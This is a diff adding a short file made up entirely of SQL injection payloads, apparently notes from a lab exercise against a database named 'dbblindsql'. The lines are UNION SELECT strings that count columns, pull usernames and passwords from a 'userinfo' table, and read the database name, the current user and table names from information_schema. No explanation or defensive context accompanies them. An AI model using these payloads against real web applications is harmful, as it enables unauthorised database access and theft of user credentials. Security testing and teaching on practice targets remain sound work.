@@ -1,0 +1,17 @@
+
+' union select 1,2,3,4,5-- -
+
+' union select 1,2,'hehe',4,5-- -
+'union select 1,2,Price,4,5 from table -- -
+'union select 1,2,password,4,5 from userinfo -- -
+'union select 1,2,Price,4,5 from product-- -
+-1'union select 1,2,Price,4,5 from product-- -
+-1'union select 1,username,password,4,5 from userinfo -- -
+-1'union select 1,username,password,4,5 from userinfo -- -
+
+
+
+-1' union select 1,2,database(),4,5-- -
+-1' union select 1,2,user(),4,5-- -
+
+-1' union select 1,2,table_name,4,5 from information_schema.tables where table_schema = 'dbblindsql'-- -
